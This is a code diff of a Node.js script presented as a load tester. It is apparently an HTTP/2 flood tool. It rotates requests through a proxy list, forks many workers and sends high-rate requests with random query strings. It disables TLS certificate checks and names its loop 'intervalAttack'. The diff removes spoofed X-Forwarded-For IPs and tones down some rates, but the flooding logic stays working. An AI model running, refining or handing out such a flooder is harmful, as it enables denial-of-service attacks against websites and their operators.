@@ -6,12 +6,14 @@ const fs = require('fs');
 
 process.setMaxListeners(0);
 require('events').EventEmitter.defaultMaxListeners = 0;
+
+// Handle uncaught exceptions gracefully
 process.on('uncaughtException', (err) => {
     console.error('Uncaught Exception:', err.message);
 });
 
 if (process.argv.length < 6) {
-    console.log('Usage: node load_test_optimized.js <target> <time> <rate> <threads> <proxyfile>');
+    console.log('Usage: node load_test.js <target> <time> <rate> <threads> <proxyfile>');
     process.exit(1);
 }
 
@@ -45,10 +47,6 @@ function randstr(length) {
     return result;
 }
 
-function randomIP() {
-    return `${randomIntn(1, 255)}.${randomIntn(0, 255)}.${randomIntn(0, 255)}.${randomIntn(0, 255)}`;
-}
-
 const args = {
     target: process.argv[2],
     time: parseInt(process.argv[3]),
@@ -73,13 +71,10 @@ const headers = {
     'accept-encoding': 'gzip, deflate, br',
     'accept-language': 'en-US',
     'accept': 'text/html,application/json',
-    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
-    'referer': `https://${parsedTarget.host}/`
+    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36'
 };
 
 const proxies = readLines(args.proxyFile);
-let requestCount = 0;
-let errorCount = 0;
 
 if (cluster.isMaster) {
     console.clear();
@@ -90,15 +85,12 @@ if (cluster.isMaster) {
     for (let counter = 1; counter <= args.threads; counter++) {
         cluster.fork();
     }
-    setInterval(() => {
-        console.log(`Requests sent: ${requestCount}, Errors: ${errorCount}, RPS: ${(requestCount / (Date.now() / 1000)).toFixed(2)}`);
-    }, 5000);
     setTimeout(() => {
         console.log('Load test completed.');
         process.exit(0);
     }, args.time * 1000);
 } else {
-    setInterval(runLoadTest, 5);
+    setInterval(runLoadTest, 10);
 }
 
 function runLoadTest() {
@@ -106,7 +98,6 @@ function runLoadTest() {
     const [proxyHost, proxyPort] = proxyAddr.split(':');
     if (!proxyHost || !proxyPort) {
         console.error(`Invalid proxy format: ${proxyAddr}`);
-        errorCount++;
         return;
     }
 
@@ -117,9 +108,7 @@ function runLoadTest() {
         ecdhCurve: 'auto',
         host: parsedTarget.host,
         servername: parsedTarget.host,
-        rejectUnauthorized: false,
-        minVersion: 'TLSv1.2',
-        maxVersion: 'TLSv1.3'
+        rejectUnauthorized: false
     };
 
     const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);
@@ -129,37 +118,32 @@ function runLoadTest() {
         protocol: 'https:',
         settings: {
             headerTableSize: 65536,
-            maxConcurrentStreams: 15000,
+            maxConcurrentStreams: 5000,
             initialWindowSize: 6291456,
             maxHeaderListSize: 65536,
             enablePush: false
         },
-        createConnection: () => tlsConn,
-        maxSessionMemory: 150000
+        createConnection: () => tlsConn
     });
 
     client.on('connect', () => {
         const intervalAttack = setInterval(() => {
-            const batchSize = Math.min(args.rate, 3000);
-            for (let i = 0; i < batchSize; i++) {
+            for (let i = 0; i < args.rate; i++) {
                 const request = client.request({
                     ...headers,
-                    ':path': parsedTarget.path + '?' + randstr(10) + '=' + randstr(5),
-                    'x-forwarded-for': randomIP()
+                    ':path': parsedTarget.path + '?' + randstr(10) + '=' + randstr(5)
                 });
                 request.on('response', () => {
-                    requestCount++;
                     request.close();
                     request.destroy();
                 });
                 request.on('error', () => {
-                    errorCount++;
                     request.close();
                     request.destroy();
                 });
                 request.end();
             }
-        }, 5);
+        }, 20);
 
         setTimeout(() => {
             clearInterval(intervalAttack);
@@ -169,11 +153,9 @@ function runLoadTest() {
     });
 
     client.on('error', (err) => {
-        errorCount++;
         console.error(`Client error: ${err.message}`);
         client.destroy();
         tlsConn.destroy();
-        setTimeout(runLoadTest, 1000 * Math.pow(2, Math.min(errorCount, 5)));
     });
 
     client.on('close', () => {
